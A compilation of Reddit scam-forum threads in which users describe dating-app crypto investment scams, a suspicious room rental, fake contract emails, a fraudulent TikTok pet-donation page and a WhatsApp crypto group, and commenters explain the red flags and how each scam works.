She caught me at a weak financial point a couple weeks ago and I had medical bills piling up and I was venting to her about them and how I felt so financially insecure. She starts talking about crypto again and  convinced me to ‚Äúinvest‚Äù and even walked me through how to do everything with screen shots. The website she had me use seemed legit to me. Because how would I know, really? So I withdrew $500 and but it into this website via Bitcoin. The next day she showed me how to do a couple ‚Äútrades‚Äù (all with screenshots showing me how to do it) and the $500 I invested went up to $700. Seemed great until the next day she tried to convince me to pull all of my 401k (about 20k) and talked about how she would even ‚Äúlend‚Äù me more because this ‚Äúbig trade‚Äù was coming and I‚Äôd earn like 140k out of it. She tried to convince for all day to do it. Thankfully, I said no way. Not happening. 

That night after we were done talking for the evening, I started to regret what I did and went onto the website she sent me and tried to withdrawal the money and it wouldn‚Äôt let me. I tried everything and that‚Äôs when I noticed some stuff about the website that didn‚Äôt look right. My stomach sank to my feet. Then i came here and typed in ‚Äúcrypto scam‚Äù and after three hours of going down the rabbit hole, I knew I was deceived. So I messaged her and ripped her a new one. The next morning she just said I didn‚Äôt know what I was talking about and how could i ‚Äúdoubt‚Äù her when we have been talking for 4 months. She even sent me a picture of her license to ‚Äúprove‚Äù she was real. I told her, I know you‚Äôre real you‚Äôre just a POS and karma will get you. She didn‚Äôt even defend herself. Didn‚Äôt even try to convince me  this wasn‚Äôt a scam. I blocked her and deleted my data and account. 

Thank god for this Reddit and yeah I am out $500 but it could have been worse! It could have been so much worse!

- This is the first time *I've seen* that scam target women. And it works exactly the same, too. Interesting.
- "She" isn't a woman. There is no "she." There's a group of dudes running this scam on 100s, if not more. The video/pictures you saw are a model or another victim they've stolen info from. The license is either fake or it's another victim's license.

It's ALL fake, including the "girl."
- Oh man, they're even going wlw. I'm mlm and was only on tinder for men and it also happened to me. Lost $10k. Beware of !recovery scammers!
- Trying to meet someone online is hell these days. So many scammers. You need to educate yourself.

Someone who is actually interested in meeting you will not start talking about money or investing before getting deep into an in-person relationship. Also, sending racy pics or asking you for nudes is a very large red flag.

There are many sad stories here on r/scams of people who have lost money to scams that begin with meeting someone online. They pretend to be interested in you for a few days, weeks, even longer, and then they move on to the next stage of the scam: stealing your money with sextortion blackmail, or stealing your money with  fake crypto trading sites, or advance fee scams.
- I was fed the same script 3 times. The "rich" uncle etc.
- Given the losses you hear about hitting some people, tens and hundreds of thousands of dollars - only losing $500 really is sort of a godsend.  Kudos for having good twitching antennae - and listening to them.
- These scammers target people who are desperate for money and/or lonely so of course both men and women are victims.

A buddy of mine is on those dating apps and he figures that only one in for "women" who contact him are real, the rest are fake profiles.
- I would have had never thought they would target WLW
- Yeah, the scammers aren't discriminatory. Equal opportunity scams. Several men have posted about mlm scams here -- Bumble, Tinder, Grindr. Some are pig butchering / crypto, some are sextortion.
- Right? The fact they are targeting WLW had me shocked.
- Hi /u/HotComfortable3418, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.


**
- I agree! It has certainly changed since I was on them about eight years ago
- Why? Is it because they target women instead of men? I heard more stories about this happening to women (specifically older or middle aged straight ladies) than men.

- A modern, fully updated phone is a very hard target. Unless you're running a decrepit OS, you jailbroke your phone, or you've pissed off a nation-state intelligence agency, your phone doesn't have a virus.
- Oh the irony. As a "boomer" I have to help the kids. The assumption that *all* young people know tech better than someone older is just propoganda. Techies will tech regardless of age. Worse, many of the younger Millennials or Gen Z see devices as black boxes with no real understanding of how they work.
- Or just factory reset your phone
- What?

This is simply not factual.
- And geek squad is garbage.
- Samsung preinstalls mccrappafe but you don't have to turn it on. Personally I have the free version of malwarebytes installed and run it about once a week.
- Calling out a scam then suggest another scam with the geek squad‚Ä¶

You can browse internet, you can make your own research on the subject on how to remove malware‚Ä¶ no need to get scammed by Best Buy‚Ä¶
- This. You don‚Äôt have a virus on your phone - ignore callers pretending you do.
- Even if you rooted/jailbroken your phone unless you give SU access to random apps/install sketchy tweaks you can't get malware too. Even a jailbreak works on a permission basis.
- This is very true.  The newer generations who grew up with smart phones are less computer literate and have no concept of files, directories, etc.  Their phone are just these devices that show them things.
- Yeah the idea that the youths (and I mean myself in that) would just be so good with tech did not pan out. 

I liken it to cars. Most folk have no idea how their car works outside of "turn ignition on and car goes". Same for their devices.
- Good example. I spend time teaching young people in the area about changing tires and regular maintenance. My favorite was the mid-twenty something who had a car for 5 years and it was running poorly. They had no idea the oil needed occasional changes. The concept of a breaker bar to help loosen lug nuts is like some great secret unveiled.

Title: Rental question is this weird?
Body: I am looking to rent a room and live in Tennessee I found a woman off a rental app and am supposed to move in tomorrow. I just viewed the house with her and it‚Äôs very large and beautiful. I noticed the car in the driveway had California tags and she has a California area code. The house looks barely lived in. She said she works remotely and travels back and forth from here to Cali and won‚Äôt be here most the time. I told her I noticed she had cali tags she said oh that‚Äôs not my car that‚Äôs the other roommates. I‚Äôm confused like you work remotely and she said she is an engineer. Why travel? Why is the other roommate from cali also? Why buy a house for a remote job in a state where none of your family or husband in? Why does the house seem not lived in and staged? Something felt off but I‚Äôve never rented a room before so idk if I‚Äôm just paranoid. Cameras everywhere and she only accepts payment from Venmo. The office had like 5 huge computers in it and a huge ass printer. Maybe I‚Äôve watched too much dateline but does this seem odd to anyone else

- Everything seems weird to me, but yeah, this doesn‚Äôt sound right. I‚Äôd make sure the house isn‚Äôt actually on the market for sale and she has gotten in through the lockbox. 

Only accepting Venmo bothers me as well. I‚Äôd have a lot more questions before handing her any money.
- If it does not make sense and you have a bad feeling just don‚Äòt rent it. Payments only via one app sounds very scammy to me.
- Ask a Realtor who owns the house.
- Yeah it seems weird. 

Get a rental agreement and ask to submit payment by check - you want an audit trail. 

Then go to the county clerks website and see who owns the property. If it‚Äôs her, great. 

BTW, lots of tech workers went remote during COVID, and TN was a destination because it‚Äôs kind of nice country and generally cheap
- Go back and ask the neighbors what's up with the house. There are so many real estate scams out there, you have good reason to worry. Paying by venmo has no protections. They will not give you your money back if she takes it and ghosts you.
- The fact that she works remotely and travels is not weird. I worked for a while in a city where I didn't live, and I went to the city once or twice a month. 

More worrying is that you're planning to move into a house with "other roommates" you haven't met and know nothing about. That's a bit odd - can you talk to them? Get their names and contact info? 

Sounds like you're under pressure to go forward with this, which makes you vulnerable to a scam. If you decide to go forward, don't give her money until you have a countersigned rental agreement and get the keys at the time when you give the money. Ideally, this should happen in person at the house.
- Sometimes squatters will take over a house and rent to victims like you. The actual owners eventually show up and you get thrown out and possibly charged with trespassing.

Get a signed paper lease and do more research before making any commitment. Might be legit, but lots of red flags. If your gut tells you it's bad, trust your gut.
- We kept our house in Oklahoma for like 2 years after we moved to South Dakota. Now we still own the house in South Dakota and rent it out but we live in Michigan. It might be legit!
- Then talk to the neighbours and then the city or whoever is in charge to find out who owns the house/land.
- Venmo only? Has there ever been a post on here where that turned out to be real?
- Go on the county assessor web site and see who owns the house.
- I'd be very skeptical.   The fact that you are suspicious means you should move on.
- A coworker of mine rented a room. Things were good for 3 months.....until he came home from work the one day and the locks had been changed. He called the cops but nothing was done. He had his mail going to a PO Box and never signed a lease because the homeowner planned it all that way. My coworker had no proof of having lived there and the homeowner stole all of the belongings and sold stuff off. Repeat the cycle, homeowner does this over and over. 

I would NEVER rent anywhere unless there's a legal binding document to sign.
- This does not seem strange at to me at all. Granted, I lived in California. Tennessee is likely a nice place to get a good home at a good price (compared to parts of California). I have moved around a bit - and family has never been a big draw. I‚Äôve been thinking lately of moving to somewhere that I have zero connections.

Not sure about the husband part though.
- Check with county records to see who actually owns the property.
- Property  records are public.
- Have you paid any deposit or rent yet ?
- I‚Äôm gonna google the address bc you could be right. And yea if you work remotely why travel???
- I paid rent by Venmo for three years. I‚Äôd do it again in a heartbeat. Definitely prefer it only most other options.
- I paid rent by Venmo for three years. I‚Äôd do it again in a heartbeat. Definitely prefer it only most other options.
- I‚Äôm leaving a bad situation and am kinda in a crunch. This is the second house I viewed and the first one was in a really sketchy neighborhood. I would love to live in this area and it‚Äôs only $900 was really wanting this to work üò©
- why? why not just let someone own the house they live in?
- Yea maybe I‚Äôm just overthinking this and trying to find an excuse not to leave when I know that‚Äôs what I need to do. The working remotely throws me off though. Why go between two states if you work from home.
- No I haven‚Äôt.
- You need to do that to see if it's for sale. Also check Airbnb and Vrbo because it could be a rental on one of those platforms.

If none of that turns up anything, ask the neighbors. One of them might know.
- In most areas you can find property records online too. Google the county and "property search" and see who owns it.
- Oh I did as well, but only because I knew the landlord. He had rented a home to a friend and I was positive he owned the property. Big difference in this situation. It should not be the only method accepted, especially in a new tenant/landlord situation.
- Echo echo echo
- This just solidifies that it's a scam. Sounds too good to be true? It's a scam.
- We tried to sell first! The interest rates are so high we didn‚Äôt even have a single person come to look at it for nearly 6 months! Trust me we‚Äôd prefer to just sell.
- There are lots of reasons why people rent out a home: high interest rates have depressed housing prices in some areas, so it might not be a great selling market; or they might someday move back; or they're making a tidy profit from the rental.
- I‚Äôm working from home in NYC right now. Paying silly insane rent. Which is part of why I‚Äôm interested in trying something more rural. But I‚Äôd likely still visit NYC even if I moved. I‚Äôve also contemplated having two places.

She‚Äôs doing it. I just think about it, but it  seems totally reasonable to me.
- Does she own two homes?  You can make a lot of money renting a second home.

It sounds kinda shady but Ive lived in shady rentals before our of desperation and been ok.  It's a risk, that's for sure
- Seconding this: talk to the neighbors.
- We have to show a profit to continue doing it but we charge a little more than the actual mortgage but we also have a company that deals with everything and runs credit checks and the whole shebang so while we show a profit after we pay their fees I‚Äôm pretty sure we take a small loss üò¢¬†
Add in the fact that before it sells it‚Äôll need new carpet at bare minimum but I‚Äôm guessing it‚Äôll need more than that! We haven‚Äôt seen it now in 2 years üò¨

- Scammers getting really lazy. If they lose touch with their customers, they're going to lose business.
- I mean, you did do it, if "it" is defined as "answer the phone."
- Sounds scammy.  If you are really curious you could call that number from a burner and see who answers.  But DO NOT give them any information about you including your name.  Any company that is doing that, knows that they are doing that, and will know exactly what you‚Äôre talking about when you call them.  It‚Äôs also possible that the number is spoofed, and the person you call back is not the actual person who called you, so keep that in mind.
- Yes, it's a scam. Wants your guilty conscious to call them so they can blackmail you for what you did.
- Could be a scam or scummy marketing. In any case, report as spam and move on
- Have seen a couple of these on this sub over the past week. Fuggedaboutit.
- Nope. Never heard of it but I wouldn't know if I got that kind of call because my spam filter would be talking to it instead of me.
- Hilarious!  Just laugh and hang up.
- Use of AI for scam üòÖ

Title: Vodafone Fake Contract?

They send a welcome email for a contract I didn't sign up for. The attached pdf contains information like my email and name.

Signature looks like it was written on someone's phone in blue big caps. Weirdest part is a lot of information is wrong like an address which is in Qatar or DOB etc but they got my nationality right, which let's say they shouldn't know...

- Hi /u/Plastic-Anxiety-8835, AutoModerator has detected keywords in your post indicating that this is a porn blackmail email scam. The exact wording of the emails varies, but there are generally four main parts. They claim to have placed software/malware on a porn/adult video site, they claim to have a video of you masturbating or watching porn, they threaten to release the video to your friends/family/loved ones/boss/dog, and they demand that you pay them in order for them to delete the video. There are variations of this scam that claim you were caught in a child porn/grooming sting. Rest assured that this is a very common spam campaign and there is no truth behind the email or the threats. While this type of blackmail attempt is a bluff, even when the blackmailer actually has compromising videos, paying them does not buy silence - it merely ensures more demands for money. One should never pay a blackmailer... [Here is the /r/scams mega thread on this scam](https://www.reddit.com/r/Scams/comments/8gsjba/the_blackmail_email_scam/).

- vodafone . qa is a legitimate domain for Vodafone in Qatar.  Now, whether the "noreplycrm" part is actually them remains to be proven.  I'm guessing some scammer is just picking email addresses that sound plausible to use.

This sounds like a possible !refund scam where they want you to contact them to get your "payment" back for something that you never paid for in the first place, and they will get all your banking information and credit card info.

OR it's possible that some dipshit signed up for Vodaphone services and mistakenly typed in your email address instead of their own.

Either way, I wouldn't do anything, see if they send any more emails.  Definitely don't send anyone your banking info.

- Hi /u/Smooth_Security4607, AutoModerator has been summoned to explain the Refund scam.

Refund scams usually start with a spam email about a fake transaction, although they can also be sent through SMS or any other messaging service. The message will provide you with a phone number to call if you want to cancel the transaction, and if you call the scammers will try to get you to provide credit card or banking information in order to receive your refund. Scammers have been taking advantage of Paypal's invoice system to send out realistic scam emails through Paypal itself, here is a news article about that technique: https://krebsonsecurity.com/2022/08/paypal-phishing-scam-uses-invoices-sent-via-paypal/. Here is a Snopes article regarding the Norton variant of this scam: https://www.snopes.com/fact-check/norton-email-renewal-scam/

If you know someone that fell for a refund scam, sit down together to watch this video by Jim Browning and try to retrace their steps: https://youtu.be/X4PllvUowaQ

- Sounds good, will wait and see. Just seems like whoever did this knows more about me than I think is all. I really don't think they accidentally put my email because of the nationality factor. The odds of someone with my name and from my country then being sent to my email is unlikely. My full name is very and I mean very unique.
- OP said the attachment had their name, email, and nationality. It's possible someone couldn't/didn't want to get a Vodafone contract in their own name in Qatar and stole OP's identity. Really depends on if the email is valid, I don't know if Vodafone offers consumer emails at that domain but if not I'd think it's likely from them.

Just wanted to come on here to warn others about a scam on TikTok from an account called Little Luna‚Äôs Journey. They claim they need donations for a surgery for their cat who got attacked by a dog.

This is all a lie, of course. The cat‚Äôs actual name is Chief and the real owner shows the cat on their own TikTok page where they explain that he had an accident when he was younger but he‚Äôs totally fine now.

The scammer has made close to $3000 just today. Hoping this post will save others from supporting this fake page as I know animals really pull at the heart strings of many.

Don't trust strangers in the internet, especially when money is involved.

TikTok is just like X now, run BY fascists FOR fascists. Anyone who is still on TikTok today is just begging to be scammed.

- Why why why will people give money to strangers on the internet before they'll donate to local animal rescues who they can SEE are doing good work and saving many animals from a life of misery?
- Another thing is what she‚Äôs saying the cat has is treatable for way less at the average vet üò≥ so these prices she‚Äôs coming up with are crazy
- Lots of gullible people with brain rot
- Not a girl, just to begin with. That‚Äôs organized crime v3.0, all the need is any kind of internet connected device. Probably some wannabe‚Äôs run their business from their phone but the vast majority are no less than clerks of a company with strict rules and workflows to follow to accomplish goals in terms of victims and money raided. Yt is full of ethic hackers who destroys their offices - mostly call centers, but be sure for any call center with dozens of operators, there are thousands of scam operations run by just a few people.
- Definitely. I reported all their donations links and the sites were very active in removing them so I am thankful for that.
- Same! I reported their donations links every time now and at least that gets taken down. Their most recent one just got removed and now their bio says ‚Äòwe did it‚Äô to reach their goal lol
- report to GOFUNDME..
- Thank god tiktok is the only place on the internet where people try to strongarm emotions to scam you!
- WHOOAAAAAA no way
- oh , I wish.. FBM, KIjiji, ebay, Scams are EVERY WHERE..
- They‚Äôve been doing this since last July. Just spreading the word to help others so move along friend üëçüèº
- It‚Äôs insane that people like this can sleep at night!! I keep looking at the donations for ‚ÄòLuna‚Äô and they keep coming in all day and all night. They‚Äôve been doing this since last year so I can‚Äôt imagine how much they‚Äôve made in total. I wish TikTok made it easier to report these accounts because doing so does nothing üò´
- They weren‚Äôt using gofundme. They kept changing to Ko-Fi and Donorbox, both which got removed successfully.
- Way.
- I do TNR with a feral colony on top of my foster fails (10) & people are always suggesting that I should ask people (like on TikTok) for donations to my cause. I'm quick to say that I would embarrassed to get on any social media sites begging for money. It's my hobby and I love doing what I do. I wouldn't have gotten so involved & invested if I couldn't afford to do it. But I guess we live in a time when asking for help from strangers in the name of whatever cause has become commonplace and seemingly acceptable. I'm more than glad to donate to causes if I personally know the person & know what they and their families are going through but to just donate to this one & that one just because they present a compelling sob story - well, that's not enough for me. And stories about folks grifting strangers online is one of main reasons I don't donate to someone i don't know. I will have some cat owner friend me on TikTok and occasionally you'll start hearing about their cat's illness or accident and then they say, link to my GFM or their venmo/ cashapp info is in their bio & I'm immediately not interested. It's utterly ridiculous üôÑ
- There's a reason the term catfishing is a reference to a bottom feeding fish and humans are no different, we have a percentage of bottom feeders as well. In a way, this has persisted as a minor way of keeping the gene pool healthy by eliminating the less intelligent or, at least, it used to. Nowadays, society itself is a safety net so people can fall for scams, lose all their money and yet not be driven into complete penury and death.
- OK.. Sorry... So, Dont Donorbox or Ko-fi have complaint / report channels?
- My friends wanted me to set up one of these when my cats got sick and I was like yea no half the people gonna think it‚Äôs a scam because a lot of them are and it‚Äôs also just kinda awkward to ask strangers 
I found the money my own way so kitty all good now
- Super ridiculous. I‚Äôve never donated to anyone unless I know them and trust where it‚Äôs going. So many people just give without thinking and I know it‚Äôs because they have their heart in it but I wish they did a bit more research beforehand. Site note, thanks for caring for so many cats! You‚Äôre a great person ü´∂üèº
- They got removed successfully on both of those platforms because I reported it every time they made new links.
- Agree. And thanks. Lol, can I get you to tell my husband that? üòÖ
- I will put in a good word üòÇ

Title: Ebay seller has not given USPS item since Jan. 21st of label creation date
Body: The ebay account is from Mexico, ships from several US locations. Item I purchased specifically ships from Virginia, but the shipping label was created in Rhode Island. I purchased the item on the 20th, shipping label gets created at 4 am 21st, and USPS still has not received the item. I message the seller on 23rd and said "Hello, when will you be shipping this item out if you don't mind me asking?," the seller replies "Item was sent out, wait i ask USPS what happend" spelling error and bad English included.

- Sometimes USPS fails to scan in their packages when they first receive them. Sometimes people are slow to ship stuff. It's only been 3 days, I know in the age of Amazon that seems like forever but it's really not that long. Seller could be trying to save face because they haven't gotten their ass to the post office yet or it could have gotten lost or stolen. It could also be a scammer who never had any intention of shipping anything. Does the seller have much feedback on eBay? We don't have enough information to know if this is a scam or not. If you never get the item, report it to eBay and get your money back.
- I‚Äôve gotten deliveries that still show pending receipt in the usps system. USPS tracking is utter shit.
- Jan 21st, and its only 25th.  You have 30 days from the ESTIMATED delivery date to file an item not arrived, it is then up to the seller to PROVE it was sent, and delivered.
- Yeah, if it was FedEx or UPS I would assume scam at this point, but USPS is horrible at scanning packages, sometimes they show up at my house before they ever show up on tracking.

I've had this exact thing happen as an eBay seller twice, both times it took over an extra week and I had already filed a missing package report but then it finally reappeared in their system and got delivered.
- Nah I get how it is, I sell on ebay and the longest I took was exactly 3 days as well. I guess I'm just confused and freaking out about it, especially bcs they only used stock images for the listing and the whole multi-location thing from a non-business seller has me tripping too. The sellers profile has 95.8% feedback with only 4 negative reviews, with one saying "seller is selling fake casio watches," I doubt someone would make fake watches of something that's already extremely cheap but also that's exactly what I ordered was a casio from the seller.
- Very much agree.  Have had several items from Ebay sit in "Label created" for a few days, then show up at my door.   More likely with sellers who ship from a warehouse or in bulk, it seems.

I've also sold stuff, created the label and forgotten to drop it or put out for pickup for a couple days.

Hopefully, OP seller is legit and will get things moving

Title: Education Pioneer Wealth Society-educationpioneer.com is a scam
Body: Education Pioneer Wealth Society
A few days ago, my dad reached out, excited to share a new investment platform he had discovered. He urged me to join in, claiming it was a guaranteed opportunity to earn big returns‚Äîinvest $5,000 and get a 200% return. His enthusiasm immediately raised red flags for me. The website he shared looked like a hollow shell with no real substance, just the kind of thing scammers use to bait unsuspecting victims.

What made me even more suspicious was the text he sent. It sounded like a copy-pasted pitch straight out of a multi-level marketing (MLM) playbook. To make matters worse, he showed me a picture of the person he‚Äôd been chatting with on the platform‚Äîsomeone whose profile screamed "AI-generated" or "scam."

When I called him to voice my concerns, he became defensive and frustrated. He couldn‚Äôt understand why I was so hesitant to invest in what he called a "sure thing." He assured me that he was making trades through his Charles Schwab account and that this new platform didn‚Äôt have access to his funds. He even mentioned that he recently lost $58 on a trade, and the firm promised to reimburse him with Bitcoin.

- Education Pioneer Wealth has been reported as a crypto scam, several times over the past few months, on r/cryptoscams:

https://www.reddit.com/r/CryptoScams/s/8Kv7G7CXnz
- It's a certain scam as soon as they pair 'guaranteed' with '200% return'.

These kinds of investment scams are easy to suss out when you apply this rule:

**Assuming everything they are pitching is true, does it make sense that they would let you (or your father) - a stranger - in on their golden goose?**

If they could really guarantee a 200% return, wouldn't they (the operators of the site) just do it themselves? Why would they share this with a stranger?

Because, obviously, the true profit in the scheme is getting their hands on other people's money.

The insanely high rate of return cited is simply an unvarnished attempt to activate your father's greed.
- 200%return? In what time period? Even Bernie Madoff didn't promise 200%, and he was running the largest Ponzi scam ever discovered in the US. 

Anyone promising guaranteed returns on an investment is a lying scammer who will take all your money. Your dad is ignorant, gullible, and greedy.

You can try sitting with him and watching videos about investment scams. But if he's deep into delusion and denial, he won't stop until he loses all his money.

Thus type of scam has bern reported here before. It's a long-term scam. He is in Phase 1, trading in his own brokerage account with the guru's signals. So he wins a lot, he loses a little. Good so far. They may be running a pump and dump scheme, buying thinly traded stocks at a low price, convincing you and others to buy, which drives up the price. Then you get the signal from the guru (let's call him Professor S) to sell, you all sell, and you all make money (but Professor S makes more, because he bought at a lower price).

Phase 2: Now that you've made money, and you believe in your guru, they move into the next phase. Professor S will ask you to "invest" on his super special proprietary website. So, you give them money, and they show you screens with numbers that go up. **You think that you're investing, but the website is phony. In reality, you are giving your money to scammers.** Professor S and his team have created a whole phony website. But you don't know that, so you keep investing. You give them all your savings. The screens show that you have a large profit.

Phase 3: You want to withdraw some of your "profit". They tell you that you need to pre-pay 10% in taxes. Well, the screens show you big numbers, so you give them more money. Wait -- not so fast, they need transfer fees. And management fees. And then . . .  the super special proprietary website disappears. You lose everything you gave them. **Because you never really invested your money, you gave it to scammers. There is no investing site, it was all a pack of lies to take your money.**

Professor Scammy and his team create a new super special proprietary website with a different name, find a new group of likely victims, and start again.

Meanwhile, you lost all of your savings and investments, you can't pay your mortgage, and those friends that you convinced to invest are broke and mad at you.

edit: it's 200%, I missed that
- As said, guaranteed returns have always been and still are absolutely a scam. I found some very strange reviews where they were 1 star, but the review only said good things but I also found reviews like this:

At first everything looks legit, but don't let them fool you, the trading platform they use is controlled by them, they can lock your money in and hold it leaving you empty handed, also when trading they have these whales attacks that can bring the price to -450% and wipe your account clean, please be aware and don't loose your hard earned money like i did. I do not doubt that they have an AI system but one designed to steal your money.
The whatsapp VIP group is a front and not real it is all a fa√ßade.
- You have to learn what a realistic investments can guarantee in returns. It's 4-5% PER YEAR. I'm sorry this scam took you in, but stop trying to chase unrealistic returns. Don't give money to anyone promising you that you will make more than that.

Title: Should I be worried about the people at my door?
Body: This is my first time on Reddit but here we go‚Ä¶.        A friend of mine (female) was in a grocery store and came out to her car with an envelope on it saying seed of faith with two usb flash drives inside of it. Yes odd but wasn‚Äôt Taken too seriously and they were brought to the cops to be disposed of. Then she got home and someone knocked on the door. And waited there for 10 minutes. Not very unusual but she was weirded out by the drives so she called her neighbors asking if anyone else had gotten a doorbell ring. Nobody had. Not a single one. Keep in mind this is once the sun goes down so it is DARK outside. A day goes by and it happens again. Except This time it is a girl knocking on the door. The girl stayed for a few minutes and then walked a house down and met up with a man on the street and they walked down to a white van (the exact van in your head yes, that van) and they drove away. The neighbors again did not get a ring on their doorbell. Twice in two days this house was targeted. Is this something to be worried about? How would you feel if this was your house or your situation? Are the drives and the people at the door connected? Are we just being paranoid? I‚Äôd like some insight thanks. Try not to spook me if you don‚Äôt have to but I‚Äôd like your honest opinions. Thanks.

- Nice to find someone on here who did not open the door.
- That doesn't sound like a scam. More like she pissed off Scientology (or some sect) somehow.
- This could be a scam, or it could be that people have been sent to that address by a scammer (someone selling a car who is using your address, for example). Go to your local police station, tell them. They will know if something like this has been reported in your neighborhood.

Also, get one of those doorbell camera video recorder things, if you don't have one.
- Faith seed is a term used by evangelicals who promise supernatural debt reduction, like Peter popoff
- She did the right thing. Good for her for turning the USBs over to the police without looking at them. That sounds like some dumbass proselytic religious group, the tech-savvy equivalent of ringing your doorbell at 7 am on a Sunday morning to ask if you're saved. (Personally, I consider all of those people scammers, but that's just me.)

I second the recommendation that she get a camera doorbell. Those things are great: you can ask what someone wants without opening the door, and even if you're not home. (But don't say so.) If the person gives a shady answer, you hang up and leave them standing there until they go away.

Even better: if there's a camera doorbell, scammers tend to go somewhere else. 

Is it weird? A little bit, perhaps. Probably nothing to worry about. Possibly someone used her address as part of a rental scam or similar. (Search on this sub to find out about those.) 

It's good to be awake and careful, but no need to get too anxious.
- The only thing I can find about seed of faith is a song and a church in Salem, OR.  I think your friend handled everything correctly.  I also urge her to get a doorbell camera.
- Ring doorbell for video of them and call police if it happens again
- I find that a Mossberg or Remington pump-action 12 gauge usually works best for this situation. Where the Hell do you live? You got some weird sh!t going on in your neighborhood.
- It almost seems like it was connected & they came by the house to see if she viewed the flash drives, & try to engage in convo with her, but how would they know her address ??? Strange coincidence.....
- It's been a while, but I'd be shocked of Scientology would say "seed of faith".¬† They say tons of weird shit, but that's not in their scripts.¬† And OP probably hasn't done anything, unless they have been directly going after Scientology, to warrent harassment.¬† They spend that on ex-members, not complete strangers.¬†¬†


Fuck Co$ on every level, I'm fully supportive of direct action against them; destroy their literature and harassment them out of publ7c spaces, but this ain't them.¬†¬†


I also doubt that the drives have anything to do with random visitors.¬† ¬†Again, unless OP has other info they aren't mentioning?




If I were going to bet money on an extremist group co-opting xtianity and leaving thumb drives around, neo-nazis do that.¬† It's brought up multiple times on the excellent podcast Weird Little Guys.¬†¬†


Again, I doubt anyone is surveying OP enough to connect this and I'm kinda paranoid.¬†¬†



Pics of the stuff would be nice?
- You can make easy monthly payments, just use this pre-paid envelope!  Its all for god of course just make the checks payable to their pastor.
- [removed]
- They used to ask if you were saved, now they give out flash drives and ask if you are saved AND backed up!
- How do you expect God to make you rich if you don't give him your money?

The messages have this nasty sexual undertone, he's asking you to plant your seed in him to give him powers and all this.
- The blessing is tenfold your faith!  Write that check now!

Title: NEO ARK - WHATSAPP CRYPTO SCAM
Body: Warning: Crypto Scam Alert

I fell victim to a WhatsApp group scam. It seemed legitimate at first, with many people chatting. However, it turned out to be a bot-filled group.

 * How it works:
   * You're privately messaged by someone who guides you to send money to their wallet.
   * They direct you to download the "Neo Arc app," which appears genuine.
   * The app displays fake money growth.
   * Ultimately, they demand a 20% "tax" from an external wallet.
 * What I did:
   * I reported the scam to the state authorities.
   * I received a call today regarding the investigation (I'm unsure if it's legitimate).

Important Lesson:
Never believe promises of quick and easy money. These scams are designed to steal your funds.
Key Takeaways:
 * Be extremely cautious of unsolicited WhatsApp group invitations.
 * Thoroughly research any investment opportunity before engaging.
 * If something seems too good to be true, it probably is.
Disclaimer: This is for informational purposes only and does not constitute financial or legal advice.
I hope this helps!


UPDATE
Regarding the phone call I received today, I googled the lawyer and called the firm. However, the firm's location did not match what the original caller provided. When I spoke with the real lawyer  at the firm, they confirmed the call i received is fake And they don't have firm in NY . They had received multiple calls from people who received similar letters and emails.


Below is the message I received prior to me verifying . (Took out the lawyers name they used and replaced with P D)

"" "" Hi I tried to call you but seems you're busy now.I‚Äôm sending you a text message so that you can read in your convenient time.

- You were scammed by your friend. You were scammed by a phony crypto trading site.

*You are being scammed by someone pretending to be lawyers.*
- >WhatsApp group

That's the opposite of legitimate seeming
- Thanks for posting. Unfortunately this is a common scam, which is why some of us skimmed your post and misinterpreted the last part. The new part if your story is the scammers posing as investigating lawyers. You need to block and ignore all of these scammers.

I'm sorry you lost money. Hopefully you learned a lesson.

**No legit company/trader/investor is using WhatsApp or Telegram. No legit company/trader/investor is approaching people on X or through a "random" text message.**

No legit company forces you to pay a "fee" or "taxes" to withdraw money. That's just a scam to suck more money out of you.

As others have said, the money is gone. You didn't  invest money, you gave it to the scammers.  **There is no investing site or app, that's all lies, nothing but lies.** There is no profit. The screens that show how much you made? Just numbers on a screen to make you believe that you were making money.  Scammers make a whole fake crypto website. It's not hard to create a website. All the info and $$ figures on the site were fake, just big numbers on a screen to make you think you made money. Check out other stories on this sub. People lose thousands, they lose all their savings.

If you want to report it, report online to the FBI. They won't do anything, though, except add it to their database. These scams are run by groups if criminals in southeast Asia or Africa. They are beyond the reach of US or European law enforcement, and they bring in money for corrupt governments in places like Myanmar, Cambodia, Nigeria, etc. so local law enforcement will do nothing.
- This is why you don't use Facebook/whatsapp. anyone can message you out of the blue like this. On Signal, when someone messages you out of the blue, you see a blurred profile picture with the text saying chat request and then have an option to continue chatting or decline and report.
- Whatsapp group does not compute with legitimate sounding. There are no legitimate Whatsapp group related to crypto or investment or anything else that purportedly makes money. None. Nada. Not a single one. Zip. 

The moment you heard it's on WhatsApp that should've been your cue to exit .
- WhatsApp. Don‚Äôt need to read further. Always a scam. What were you thinking?

As for you offer to have people call you that against the sub rules and could be another scam because who the hell knows you. 

Post is reported. 

Keep your religion to yourself as well.
- My friend led me to the group which made me not question it... My mistake but I just wanted people to be aware cuz I've never heard of this scam before
- Thank you ! I spent four months putting in "signals" daily until I realized . Smh üôÑ
- OP didn't ask for anyone to call them nor did they push their religion on anyone.  
I understand the whole WhatsApp full stop not reading anymore thing but you should read before making remarks like that.
- My friend set me up so I believed it was legitimate. 

I don't think you're reading my post correctly cuz the bottom is the message I received from the scammers.
- What mental illness do you have?
- You're just hating cuz you can't read.
 I wasn't pushing any religion nor asking anyone to call me.
- > My friend set me up

So, your friend is either

- in on it
- another victim
- not your friend but an account hijacker
- Yeah that's honestly what I was trying to figure out..... 
 it seems like too smart of a scam for them to be in on it?? but I could never be sure 

And then the phone call I received today was some lady pretending to be from a law firm that is working with this scam case and wants to help me ...
